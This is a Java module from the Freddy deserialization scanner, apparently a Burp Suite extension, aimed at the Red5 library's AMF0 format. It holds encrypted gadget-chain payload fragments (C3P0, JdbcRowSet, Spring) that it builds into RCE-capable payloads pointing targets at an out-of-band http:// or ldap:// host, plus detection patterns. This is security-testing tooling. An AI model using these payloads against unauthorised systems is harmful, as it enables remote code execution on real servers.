package nb.freddy.modules.java;

import nb.freddy.modules.FreddyModuleBase;
import nb.freddy.modules.IndicatorTarget;
import nb.freddy.modules.SeverityRating;
import nb.freddy.modules.TargetPlatform;

import java.util.regex.Pattern;

/***********************************************************
 * Module targeting the AMF 0 format support of the Java
 * Red5 library.
 *
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class Red5AMF0Module extends FreddyModuleBase {
    //C3P0WrapperConnPool payload data
    private static final int C3P0WRAP_PAYLOAD_CMD_OFFSET = 1154;
    private final String C3P0WRAP_PREFIX_B64 = decrypt("");
    private final String C3P0WRAP_SUFFIX_B64 = decrypt("1CnJChbsPdDjfrLdUKMHl8sUfOPeKLNud6hMcC41NTk=");
    //JdbcRowSet payload data
    private static final int JDBC_PAYLOAD_CMD_OFFSET = 51;
    private final String JDBC_PREFIX_B64 = decrypt("/gM5jILDPtnuY+yBqkecrXTE12ByNNJ+dg1R2VgYSgAv7VEFk9fvVL4j4NiN9yVpnF45ZtzABGN23IKc+KspguQWkTP0PnqiG7awzxwzlR4=");
    private final String JDBC_SUFFIX_B64 = decrypt("VRfNUMcpRKWsETn6Jyk+6R04iYqX4ofw6ne77tGYu7ae+XuFzxdbYG/Zew67dnm31Quj7QlCQZJJbSaGjshkGowiphIBBudI/+FTXliBCsgtZe5FnXKDK0VyJ1g5hTDADONvuS8MpplBUQESw9okNc2Fg1WEHousZ0QOjr3rUYuyUilKHvq1REJjYFEQSCFCVIKcncvOJnfsF6I/p0Qh7OUQDSdLJvvUqQt6azSACoE=");
    //SpringPropertyPathFactory payload data
    private static final int SPPF_PAYLOAD_CMD_OFFSET1 = 104;
    private static final int SPPF_PAYLOAD_CMD_OFFSET2 = 402;
    private final String SPPF_PREFIX_B64 = decrypt("v4ZvSYERQyxiaFWoyBZFVYxygqYJ2S6Pr46rPSmfb1sdRuFz5ZK62K4jqjK5mtt791Qsz3BrekVcVoSFb/59BVcgV7yUVML0hdH67VEpt3RtyEJ22EIAV5CCczeXWgP5BHd9Z3vEj1ymsz5V+NdvpjY/0l4tGJeQVNXV4xTnfUCfiknjb1L6jL0uSJYM/2B8");
    private final String SPPF_MIDDLE_B64 = decrypt("xT4hyW07d9uJzjdBxNlnCWTfgtfL6KBJgq7UtDlv2wKZXijpiyNlXphJUlyoIg6gsdD7Bv0YHKpqrRuuDbuJKHlKP88jl2V/InrNhVkklTzvKU3i8PkYzKtBNR5iPAKvCSLs60jSHt1FR4EFo7oKuf+r+jHpQNDvsaB95nlZ5OlGW+boD23OWNzA0kN8nftR");
    private final String SPPF_SUFFIX_B64 = decrypt("");
    private byte[] C3P0WRAP_PAYLOAD;
    private byte[] JDBC_PAYLOAD;
    private byte[] SPPF_PAYLOAD;

    protected void initialiseModule() {
        setName("Red5-AMF0");
        setPlatform(TargetPlatform.JAVA);
        setModuleIsRCECapable(true);
        setDescriptionCaveats("");
        setRemediationDetail("");
        setSeverity(SeverityRating.HIGH);

        //Initialise payload buffers
        C3P0WRAP_PAYLOAD = buildBinaryPayloadBuffer(C3P0WRAP_PREFIX_B64, C3P0WRAP_SUFFIX_B64, true); //Note, this payload isn't actually unicode but is encoded as hex-ascii so requires two bytes space per byte of payload
        JDBC_PAYLOAD = buildBinaryPayloadBuffer(JDBC_PREFIX_B64, JDBC_SUFFIX_B64, false);
        SPPF_PAYLOAD = buildBinaryPayloadBuffer(SPPF_PREFIX_B64, SPPF_MIDDLE_B64, SPPF_SUFFIX_B64, false);

        //Register passive/active scan payloads
        registerPassiveScanIndicator(new Pattern[]{Pattern.compile("exception", Pattern.CASE_INSENSITIVE), Pattern.compile("org\\.red5\\.io\\.amf\\.")}, IndicatorTarget.RESPONSE);

        registerActiveScanExceptionPayload(new byte[]{0x0d}, "Vector objects not supported with AMF0");

        registerActiveScanCollaboratorPayload(PN_C3P0WCP, true);
        registerActiveScanCollaboratorPayload(PN_JDBC, true);
        registerActiveScanCollaboratorPayload(PN_SPRINGPPF, true);
    }

    protected byte[] generateCollaboratorBytePayload(String payloadName, String hostname) {
        switch (payloadName) {
            case PN_C3P0WCP:
                return generateBinaryPayloadWithAscHexCommand(C3P0WRAP_PAYLOAD, C3P0WRAP_PAYLOAD_CMD_OFFSET, "http://" + hostname + "/");

            case PN_JDBC:
                return generateBinaryPayload(JDBC_PAYLOAD, JDBC_PAYLOAD_CMD_OFFSET, "ldap://" + hostname + "/", false);

            case PN_SPRINGPPF:
                return generateBinaryPayload(SPPF_PAYLOAD, SPPF_PAYLOAD_CMD_OFFSET1, SPPF_PAYLOAD_CMD_OFFSET2, "ldap://" + hostname + "/", false);
        }
        return null;
    }
}
